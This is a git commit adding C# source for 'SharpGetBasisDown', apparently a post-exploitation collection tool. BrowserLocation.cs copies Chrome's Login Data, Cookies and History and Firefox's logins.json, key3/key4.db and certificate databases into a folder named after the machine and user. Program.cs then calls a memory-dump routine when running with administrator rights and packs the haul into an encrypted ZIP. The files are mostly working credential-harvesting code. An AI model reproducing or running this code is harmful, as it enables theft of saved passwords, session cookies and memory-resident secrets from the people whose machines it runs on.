164e8bcee37d0a5c8e647ab6fbdc4817715faf98
RcoIl <rcoil.me@gmail.com>
2019-06-03 11:46:50 +0800

    SharpGetBasisDown 上传

---
+++ SharpGetBasisDown/SharpGetBasisDown/BrowserLocation.cs
@@ -0,0 +1,81 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Diagnostics;
+using System.IO;
+
+namespace SharpGetBasisDown
+{
+    class BrowserLocation
+    {
+        public static string CreateBrowserDirectory(string browsername)
+        {
+            string DirectoryName = Program.CreateDirectory() + browsername;
+            if (!Directory.Exists(DirectoryName))
+            {
+                Directory.CreateDirectory(DirectoryName);
+            }
+            return DirectoryName;
+        }
+        public static void ChromeLocation()
+        {
+            string localAppData = Environment.GetEnvironmentVariable("USERPROFILE");
+            string ChromeBasePath = String.Format("{0}\\AppData\\Local\\Google\\Chrome", localAppData);
+
+            if (Directory.Exists(ChromeBasePath))
+            {
+                string ChromeHistoryPath = String.Format("{0}\\User Data\\Default\\History", ChromeBasePath);
+                string ChromeBookmarkPath = String.Format("{0}\\User Data\\Default\\Bookmarks", ChromeBasePath);
+                string ChromeCookiesPath = String.Format("{0}\\User Data\\Default\\Cookies", ChromeBasePath);
+                string ChromeLoginDataPath = String.Format("{0}\\User Data\\Default\\Login Data", ChromeBasePath);
+                string[] ChromePaths = { ChromeHistoryPath, ChromeBookmarkPath, ChromeCookiesPath, ChromeLoginDataPath };
+                string FilePath = CreateBrowserDirectory("\\Chrome");
+                foreach (string filePath in ChromePaths)
+                {
+                    if (File.Exists(filePath))
+                    {
+                        var FileName = filePath.Substring(filePath.LastIndexOf('\\'));
+                        File.Copy(filePath, FilePath + FileName);
+                    }
+                }
+            }
+            else
+            {
+                Console.WriteLine("  [>] Not Chrome Directory");
+            }
+        }
+        public static void FroefoxLocation()
+        {
+            string localAppData = Environment.GetEnvironmentVariable("USERPROFILE");
+            string FirefoxBasePath = String.Format("{0}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\", localAppData);
+            if (Directory.Exists(FirefoxBasePath))
+            {
+                string[] directories = Directory.GetDirectories(FirefoxBasePath);
+                foreach (string directory in directories)
+                {
+                    string FirefoxPlaces = string.Format("{0}\\{1}", directory, "places.sqlite");
+                    string FirefoxCer_1 = String.Format("{0}\\{1}", directory, "cert8.db");
+                    string FirefoxCer_2 = String.Format("{0}\\{1}", directory, "cert9.db");
+                    string FirefoxKey_1 = String.Format("{0}\\{1}", directory, "key3.db");
+                    string FirefoxKey_2 = String.Format("{0}\\{1}", directory, "key4.db");
+                    string FirefoxLogon = String.Format("{0}\\{1}", directory, "logins.json");
+                    string[] FirefoxPaths = { FirefoxPlaces, FirefoxCer_1, FirefoxCer_2, FirefoxKey_1, FirefoxKey_2, FirefoxLogon };
+                    string FilePath = CreateBrowserDirectory("\\Friefox");
+                    foreach (string filePath in FirefoxPaths)
+                    {
+                        if (File.Exists(filePath))
+                        {
+                            var FileName = filePath.Substring(filePath.LastIndexOf('\\'));
+                            File.Copy(filePath, FilePath + FileName);
+                        }
+                    }
+                }
+            }
+            else
+            {
+                Console.WriteLine("  [>] Not Friefox Directory");
+            }
+        }
+    }
+}
---
+++ SharpGetBasisDown/SharpGetBasisDown/Program.cs
@@ -0,0 +1,44 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.IO.Compression;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+using System.Text;
+using System.Threading;
+
+namespace SharpGetBasisDown
+{
+    class Program
+    {
+        public static string CreateDirectory()
+        {
+            string DirectoryName = Environment.CurrentDirectory + @"\GetBasisDown\" + String.Format("\\{0}_{1}", Environment.MachineName, Environment.UserName);
+            if (!Directory.Exists(DirectoryName))
+            {
+                Directory.CreateDirectory(DirectoryName);
+            }
+            return DirectoryName;
+        }
+        public static bool IsHighIntegrity()
+        {
+            WindowsIdentity identity = WindowsIdentity.GetCurrent();
+            WindowsPrincipal principal = new WindowsPrincipal(identity);
+            return principal.IsInRole(WindowsBuiltInRole.Administrator);
+        }
+
+        static void Main(string[] args)
+        {
+            BrowserLocation.ChromeLocation();
+            BrowserLocation.FroefoxLocation();
+            BasisInfo.BasisInfos();
+            if (IsHighIntegrity())
+            {
+                MiniDump.Minidump();
+            }
+            EncryptedZIPs.Encrypted(args[0]);
+        }
+    }
+}
